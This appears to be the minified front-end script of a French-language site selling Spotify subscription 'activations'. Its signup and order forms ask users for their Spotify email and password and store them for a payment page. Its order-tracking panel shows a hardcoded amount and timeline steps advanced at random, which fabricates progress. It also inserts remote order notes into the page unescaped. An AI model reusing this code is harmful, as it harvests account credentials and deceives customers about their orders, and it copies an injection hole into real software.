"use strict";(()=>{function x(){let e=document.getElementById("cookie-consent"),t=document.getElementById("accept-cookies"),n=document.getElementById("reject-cookies");!e||!t||!n||(localStorage.getItem("cookieConsent")||(e.style.display="block"),t.addEventListener("click",()=>{localStorage.setItem("cookieConsent","accepted"),e.style.display="none"}),n.addEventListener("click",()=>{localStorage.setItem("cookieConsent","rejected"),e.style.display="none"}))}function q(){let e=document.querySelector(".feature-slider");if(!e)return;let t=e.querySelector(".feature-slide-track"),n=!1,o,r,f=l=>{n=!0,e.classList.add("dragging"),o=l-e.offsetLeft,r=e.scrollLeft},a=()=>{n=!1,e.classList.remove("dragging")},g=l=>{if(!n)return;let E=l-e.offsetLeft-o;e.scrollLeft=r-E};e.addEventListener("mousedown",l=>f(l.pageX)),e.addEventListener("touchstart",l=>f(l.touches[0].pageX),{passive:!0}),window.addEventListener("mouseup",a),e.addEventListener("touchend",a),e.addEventListener("mousemove",l=>g(l.pageX)),e.addEventListener("touchmove",l=>g(l.touches[0].pageX),{passive:!0})}function X(){let e=document.getElementById("signup-form");e&&e.addEventListener("submit",t=>{t.preventDefault();let n=document.getElementById("hero-email").value.trim(),o=document.getElementById("hero-password").value.trim();!n||!o||(sessionStorage.setItem("spotifyEmail",n),sessionStorage.setItem("spotifyPassword",o),window.location.href="paiement.html")})}function N(){let e=document.getElementById("order-form");if(e){let t=document.getElementById("order-btn"),n=document.querySelectorAll('.consent-checks input[type="checkbox"]'),o=document.getElementById("cmd-email"),r=document.getElementById("cmd-password"),f=()=>{let a=Array.from(n).every(g=>g.checked);t.disabled=!a};n.forEach(a=>{a.addEventListener("change",f)}),e.addEventListener("submit",function(a){if(a.preventDefault(),!Array.from(n).every(E=>E.checked)){alert("Veuillez accepter tous les termes avant de continuer.");return}let g=o.value,l=r.value;if(!g||!l){alert("Veuillez remplir tous les champs requis.");return}sessionStorage.setItem("spotifyEmail",g),sessionStorage.setItem("spotifyPassword",l),window.location.href="paiement.html"}),f()}}function A(){X(),N()}function O(){let e=document.querySelector(".mobile-menu-btn"),t=document.querySelector(".nav");e&&t&&e.addEventListener("click",()=>{t.classList.toggle("active"),e.classList.toggle("active")})}function j(){let e=document.getElementById("back-to-top");e&&(window.addEventListener("scroll",()=>{window.pageYOffset>300?e.style.display="block":e.style.display="none"}),e.addEventListener("click",()=>{window.scrollTo({top:0,behavior:"smooth"})}))}function z(){document.querySelectorAll(".faq-item").forEach(e=>{e.querySelector("h4").addEventListener("click",()=>e.classList.toggle("open"))})}function R(){let e=document.getElementById("theme-toggle"),t=window.matchMedia("(prefers-color-scheme: dark)");if(e){let n=localStorage.getItem("theme");n?document.body.classList.toggle("light-theme",n==="light"):document.body.classList.toggle("light-theme",!t.matches),e.addEventListener("click",()=>{document.body.classList.toggle("light-theme");let o=document.body.classList.contains("light-theme");localStorage.setItem("theme",o?"light":"dark")}),t.addEventListener("change",o=>{localStorage.getItem("theme")||document.body.classList.toggle("light-theme",!o.matches)})}}function P(){O(),j(),z(),R()}var H="https://script.google.com/macros/s/AKfycbxEmJdgcerK1ENvsy8IvSnAZDJ6p4fr9hfO87haKbKrVXZaRf2Z3wnRzyQSDl527VtW/exec";function M(e){let t=document.getElementById("progress-bar-fill"),n=document.querySelectorAll(".step");if(!t||!n.length)return;let o=0;e===1?o=0:e===2?o=20:e===3?o=40:e===4?o=60:e===5&&(o=100),t.style.width=o+"%",n.forEach((r,f)=>{let a=f+1;r.classList.remove("active","completed"),a<e?r.classList.add("completed"):a===e&&r.classList.add("active")})}async function K(e){let t=document.getElementById("loading-overlay");t&&(t.style.display="flex");try{let n=await fetch(`${H}?orderID=${e}`);if(!n.ok)throw new Error("Network response was not ok.");let o=await n.json();return o.error?null:o}catch(n){return console.error("Failed to fetch tracking data:",n),null}finally{t&&(t.style.display="none")}}function U(e,t){if(t.innerHTML="",t.classList.remove("hidden"),!e){t.innerHTML='<p class="error-message">Commande non trouv\xE9e. Veuillez v\xE9rifier le num\xE9ro et r\xE9essayer.</p>';return}let o={pending:{text:"En attente",step:1},processing:{text:"En traitement",step:2},completed:{text:"Termin\xE9e",step:3}}[e.status]||{text:"Inconnu",step:0},r=`
        <div class="tracking-header">
            <div class="tracking-info">
                <h3>Commande #${e.orderID}</h3>
                <p class="tracking-date">Date: ${new Date(e.date).toLocaleDateString()}</p>
            </div>
            <div class="tracking-status">
                <span class="status-badge status-${e.status}">${o.text}</span>
            </div>
        </div>
        <div class="tracking-timeline">
            <div class="timeline-item ${o.step>=1?"completed":""}">
                <div class="timeline-icon">\u{1F4DD}</div>
                <div class="timeline-content"><h4>Commande Re\xE7ue</h4><p>Votre commande a \xE9t\xE9 enregistr\xE9e.</p></div>
            </div>
            <div class="timeline-item ${o.step>=2?"completed":""}">
                <div class="timeline-icon">\u2699\uFE0F</div>
                <div class="timeline-content"><h4>En Traitement</h4><p>Nous pr\xE9parons l'activation de votre compte.</p></div>
            </div>
            <div class="timeline-item ${o.step>=3?"completed":""}">
                <div class="timeline-icon">\u2705</div>
                <div class="timeline-content"><h4>Activation Termin\xE9e</h4><p>Votre abonnement est actif. Un email de confirmation a \xE9t\xE9 envoy\xE9.</p></div>
            </div>
        </div>
        ${e.notes?`<div class="tracking-notes"><h4>Notes:</h4><p>${e.notes}</p></div>`:""}
    `;t.innerHTML=r}function Z(){let e=document.getElementById("track-order-btn"),t=document.getElementById("order-number"),n=document.querySelector(".tracking-result");if(e&&t&&n){let o=async()=>{let r=t.value.trim();if(!r){alert("Veuillez entrer un num\xE9ro de commande.");return}let f=await K(r);U(f,n)};e.addEventListener("click",o),t.addEventListener("keypress",r=>{r.key==="Enter"&&o()})}}function J(){if(!document.getElementById("activation-progress"))return;let t=1;M(t);let n=setInterval(()=>{if(t++,t>5){clearInterval(n);return}M(t)},2e3)}function F(){document.getElementById("activation-progress")&&J(),document.querySelector(".tracking-search")&&Z()}document.addEventListener("DOMContentLoaded",()=>{x(),q(),A(),P(),F()});document.addEventListener("DOMContentLoaded",function(){let e=document.getElementById("order-form"),t=document.getElementById("order-btn"),n=document.querySelectorAll('.consent-checks input[type="checkbox"]'),o=document.getElementById("signup-form"),r=document.getElementById("hero-email"),f=document.getElementById("hero-password"),a=document.getElementById("cmd-email"),g=document.getElementById("cmd-password"),l=document.getElementById("email"),E=document.getElementById("password"),$=document.querySelectorAll(".faq-item"),k=document.getElementById("cookie-consent"),b=document.getElementById("accept-cookies"),B=document.getElementById("reject-cookies"),w=document.querySelector(".mobile-menu-btn"),C=document.querySelector(".nav"),L=document.getElementById("back-to-top"),u=document.querySelector(".feature-slider"),T=document.getElementById("theme-toggle"),I=document.getElementById("order-tracking");function V(){let s=Array.from(n).every(i=>i.checked);t.disabled=!s}if(n.forEach(s=>{s.addEventListener("change",V)}),e&&e.addEventListener("submit",function(s){if(s.preventDefault(),!Array.from(n).every(m=>m.checked)){alert("Veuillez accepter tous les termes avant de continuer.");return}let i=l.value,d=E.value;if(!i||!d){alert("Veuillez remplir tous les champs requis.");return}window.location.href="paiement.html"}),o&&o.addEventListener("submit",s=>{s.preventDefault();let i=r.value.trim(),d=f.value.trim();!i||!d||(sessionStorage.setItem("spotifyEmail",i),sessionStorage.setItem("spotifyPassword",d),window.location.href="paiement.html")}),a&&g&&t){let s=function(){t.disabled=!(a.checkValidity()&&g.value.trim())};a.addEventListener("input",s),g.addEventListener("input",s),t.addEventListener("click",()=>{sessionStorage.setItem("spotifyEmail",a.value),sessionStorage.setItem("spotifyPassword",g.value),window.location.href="paiement.html"})}if($.forEach(s=>{s.querySelector("h4").addEventListener("click",()=>s.classList.toggle("open"))}),k&&b&&B&&(localStorage.getItem("cookieConsent")||(k.style.display="block"),b.addEventListener("click",()=>{localStorage.setItem("cookieConsent","accepted"),k.style.display="none"}),B.addEventListener("click",()=>{localStorage.setItem("cookieConsent","rejected"),k.style.display="none"})),w&&C&&w.addEventListener("click",()=>{C.classList.toggle("active"),w.classList.toggle("active")}),L&&(window.addEventListener("scroll",()=>{window.pageYOffset>300?L.style.display="block":L.style.display="none"}),L.addEventListener("click",()=>{window.scrollTo({top:0,behavior:"smooth"})})),u){let s=u.querySelector(".feature-slide-track"),i=!1,d,m,p=c=>{i=!0,u.classList.add("dragging"),d=c-u.offsetLeft,m=u.scrollLeft},y=()=>{i=!1,u.classList.remove("dragging")},v=c=>{if(!i)return;let h=c-u.offsetLeft-d;u.scrollLeft=m-h};u.addEventListener("mousedown",c=>p(c.pageX)),u.addEventListener("touchstart",c=>p(c.touches[0].pageX),{passive:!0}),window.addEventListener("mouseup",y),u.addEventListener("touchend",y),u.addEventListener("mousemove",c=>v(c.pageX)),u.addEventListener("touchmove",c=>v(c.touches[0].pageX),{passive:!0})}function S(s){let i=document.getElementById("progress-bar-fill"),d=document.querySelectorAll(".step");if(!i||!d.length)return;let m=0;s===1?m=0:s===2?m=20:s===3?m=40:s===4?m=60:s===5&&(m=100),i.style.width=m+"%",d.forEach((p,y)=>{let v=y+1;p.classList.remove("active","completed"),v<s?p.classList.add("completed"):v===s&&p.classList.add("active")})}window.updateProgressBar=S;let D=window.matchMedia("(prefers-color-scheme: dark)");if(T){let s=localStorage.getItem("theme");s?document.body.classList.toggle("light-theme",s==="light"):document.body.classList.toggle("light-theme",!D.matches),T.addEventListener("click",()=>{document.body.classList.toggle("light-theme");let i=document.body.classList.contains("light-theme");localStorage.setItem("theme",i?"light":"dark")}),D.addEventListener("change",i=>{localStorage.getItem("theme")||document.body.classList.toggle("light-theme",!i.matches)})}if(I){let s=I.querySelector("#track-order-btn"),i=I.querySelector("#order-number"),d=I.querySelector(".tracking-result");s&&i&&d&&s.addEventListener("click",()=>{let m=i.value.trim();if(!m)return;d.style.display="block",document.getElementById("result-order-number").textContent=m,document.getElementById("result-order-date").textContent=new Date().toLocaleDateString(),document.getElementById("result-email").textContent="exemple@email.com",document.getElementById("result-amount").textContent="82,62$ CAD",document.getElementById("result-payment-method").textContent="PayPal",document.getElementById("result-estimated-time").textContent="3 \xE0 5 jours ouvrables";let p=new Date;document.getElementById("timeline-order-date").textContent=p.toLocaleString(),document.getElementById("timeline-payment-date").textContent=new Date(p.getTime()+1e3*60*30).toLocaleString(),document.getElementById("timeline-verification-date").textContent=new Date(p.getTime()+1e3*60*60).toLocaleString(),document.getElementById("timeline-activation-date").textContent="En attente",document.getElementById("timeline-confirmation-date").textContent="En attente";let y=()=>{let c=d.querySelectorAll(".timeline-item"),h=1;Math.random()>.3&&(c[1].classList.add("completed"),h++),Math.random()>.6&&(c[2].classList.add("completed"),h++)},v=()=>{let c=1;S(c);let h=setInterval(()=>{if(c++,c>5){clearInterval(h);return}S(c)},2e3)};y(),v()})}});})();
